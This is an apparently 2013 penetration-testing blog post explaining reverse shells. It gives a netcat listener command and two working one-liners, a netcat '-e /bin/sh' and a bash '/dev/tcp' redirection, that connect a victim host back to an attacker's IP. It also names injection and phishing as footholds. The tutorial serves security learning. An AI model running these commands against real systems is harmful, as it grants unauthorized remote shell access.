---
title: "Reverse shell methods"
date: "2013-09-30T12:00:00-04:00"
url: "/posts/reverse-shell-methods"
categories:
- infosec
tags:
- shells
- pentesting
summary: "Methods for obtaining reverse shells"
showtoc: true
---
Welcome and Hello!  Let's get started...  Today's topic: Reverse Shells

# What is a Reverse Shell?

A reverse shell is a method by which penetration testers (and bad guys!) can
gain a shell, or user command access, on a target.  They are very useful because
they initiate communication from a trusted host inside the perimeter to a host
outside of the perimeter.  This means a reverse shell has the capability to
bypass firewall ingress rules, which would prevent incoming connections - aka
bind shells - from reaching into the network to gain user command access on a
host.

See this [SANS paper][SANS] by Richard Hammer for a good overview of Reverse
Shells.

# Gaining a Reverse Shell

The first thing I do is start my listener.  This listener is crucial, as it
waits for commands I will send it from my victim's host and then do something
useful with them.

On my attack box (10.25.43.35):

```bash
$ nc -lv 8080
```
{{< figure src="/images/2013/09-30-1.png" caption="netcat listener" >}}

Now, netcat (or nc) is listening on port 8080 for incoming connections (-l) and
will print them verbosely (-v) to standard output.  All of the reverse shell
methods detailed below will reach back to this listener to establish a
connection with my attack host.

On the target's box: Here, I may or may not have several options for
communicating back to my host.  I'll outline two methods, using netcat and bash,
which are common binaries found on a target Unix box.

Note: These commands all work under the assumption I can execute commands in a
limited fashion on my victim's host already.  "Why go through the trouble of
opening a reverse shell if you can already access commands on your target?"
would be a valid question.

During a penetration test, you may discover you have the limited ability to
execute a command on a remote host.  For instance, an un-sanitized text entry
box on a website may allow you to pass a command the web server wasn't
expecting.  Perhaps you've tricked a user into clicking on a malicious link, or
opening a malicious file which executes a small set of commands.  Maybe your
target is running Windows XP and hasn't patched against [MS08-067][MS08067]
(still my favorite exploit of all time :D).

Whatever the reason you don't have full interactive access to your target, but
you want it.  You crave it.  I do, too!

Using netcat:

```bash
$ nc -e /bin/sh 10.25.43.35 8080
```

This causes my victim's box to execute /bin/sh and connect to my attacker's box
over port 8080.  As you can see in the screenshot, I'm not getting a lot of
feedback in the shell (note: no prompt)

{{< figure src="/images/2013/09-30-2.png" caption="connect back netcat" >}}

Using bash:

```bash
$ bash -i > /dev/tcp/10.25.43.35/8080 0<&1 2>&1
```

This uses the bash shell's I/O redirection and built-in method for TCP
connections to open a reverse shell.  I particularly like this method because
the syntax gives me a headache (I'm still trying to wrap my head around this
level of [I/O redirection][IOredir]) and because nearly every Unix box has bash
installed.

{{< figure src="/images/2013/09-30-3.png" caption="connect back bash" >}}

If your victim's host has python, perl, php, or ruby installed - which is very
likely - you can check out [pentestmonkey's cheat sheet][ptmonkey] for examples
of how to gain reverse shells using those methods.

[SANS]: http://www.sans.org/reading-room/whitepapers/covert/inside-out-vulnerabilities-reverse-shells-1663?show=inside-out-vulnerabilities-reverse-shells-1663&cat=covert
[ptmonkey]: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
[IOredir]: http://www.tldp.org/LDP/abs/html/io-redirection.html#IOREDIRREF
[MS08067]: http://technet.microsoft.com/en-us/security/bulletin/ms08-067
